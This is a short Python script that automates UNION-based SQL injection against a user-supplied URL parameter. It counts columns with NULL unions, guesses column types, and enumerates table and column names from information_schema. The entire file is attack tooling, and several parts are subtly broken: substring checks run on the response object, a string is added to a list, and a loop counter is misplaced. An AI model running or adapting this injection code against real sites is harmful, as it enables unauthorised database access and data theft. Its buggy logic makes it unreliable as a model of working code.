import requests

def get_column_count():
    print("Enter url with column names and selected column")
    print("e.g.  localhost:8000/abc.php?brand=")
    url = input()
    null_count = 1
    while True:
        query =  "' UNION SELECT " + "NULL, "* null_count
        query = query[:-2]
        final_query = url + query
        response = requests.get(final_query)
        if "different" in response or "select" in response:
            null_count += 1
        else:
            break

    return null_count,url

    # varchar or charactor -- "foo"
def get_column_type(null_count = 1,url = None):

    print("Get column type function called")

    if not url:
        print("Enter url with column names and selected column")
        print("e.g.  localhost:8000/abc.php?brand=")
        url = input()

    different_type = {}
    different_type["string"] = "foo"
    different_type["integer"] = 10
    different_type["float"] = 10.5

    column_type = []
    null_array = ["NULL"]*null_count
    current_index = 0
    while current_index < null_count:
        for type in different_type.keys():
            null_array[current_index] = different_type[type]
            query = [','.join(i for i in null_array[:-1])]
            query += null_array[-1]
            final_query = url + query
            response = requests.get(final_query)
            if response:
                column_type.append(type)
            current_index += 1
    i = 0
    for type in column_type:
        print("Column number "+ str(i) +" " + str(type))

    return url

def get_normal_table_name(null_count = 1, url = None):

    if not url:
        print("Enter url with column names and selected column")
        print("e.g.  localhost:8000/abc.php?brand=")
        url = input()

    print("query for normal table")
    null_striing = "1," * (null_count-1)
    null_striing = null_striing[:-1]
    final_query = url + "1 AND 1=2 UNION SELECT table_name, " + null_striing +" FROM information_schema.tables"
    print(requests.get(final_query))

    #
    # print("query for decreased table list")
    # final_query = url + "1 AND 1=2 UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’"
    # print(requests.get(final_query))
def get_column_names( url=None, null_count=1):
    null_striing = "1," * (null_count - 1)
    null_striing = null_striing[:-1]
    if not url:
        print("Enter url with column names and selected column")
        print("e.g.  localhost:8000/abc.php?brand=")
        url = input()

    print("query for Column list")
    print("Enter table name by analyzing:")
    table_name = input()

    final_query = url + "1 AND 1=2 UNION SELECT column_name, " + null_striing +" FROM information_schema.columns WHERE table_name =" + table_name
    print(requests.get(final_query))


if __name__ == "__main__":
    null_count , url = get_column_count()
    get_column_type(null_count,url)
    get_normal_table_name(null_count,url)
    get_column_names(url,null_count)
